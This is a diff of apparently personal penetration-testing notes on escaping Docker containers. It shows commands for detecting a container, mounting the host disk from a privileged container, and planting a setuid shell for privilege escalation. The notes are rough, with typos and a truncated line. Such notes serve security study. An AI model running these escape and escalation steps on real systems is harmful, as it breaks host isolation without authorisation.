@@ -11,19 +11,28 @@ Containers have networking capabilities and their own file storage. They achiev
 Typically you are trying to escape from a  container and general these escapes stem from misconfigurations of the container from services or access controls.
 
 ## How to know when you are in a container?
+
 [pspy](https://github.com/DominicBreuker/pspy) on Linux or Systernals proc\*-related tools or access with tasklist for windows.
 ```bash
+ls -la / # And find:
 .dockerenv
-ps aux # Lack of processes
 
+# Lack of processes
+ps aux 
+
+# Docker Processes
 cat /proc/1/cgroup 
 cat /proc/1/cgroup | grep docker
 ```
 
-Check for mount misconfigurations
+Check for mount misconfigurations. It is a misconfiguration if Docker container is running `--privileged`, meaning we are can mount to these disks as containerr does not need disks 
 ```bash
-mount # check if it is mounted into the host filesystem 
-# If so and you are root in dockerenv
+# check if disks are mountable into the host filesystem 
+mount | grep /dev/sda 
+mount /dev/sdaX /mnt
+
+# If you are not root or another mn
+
 cp /bin/sh $mount_misconfiguration_dir
 # Give the binary suid privileges
 chmod u+s /bin/sh  
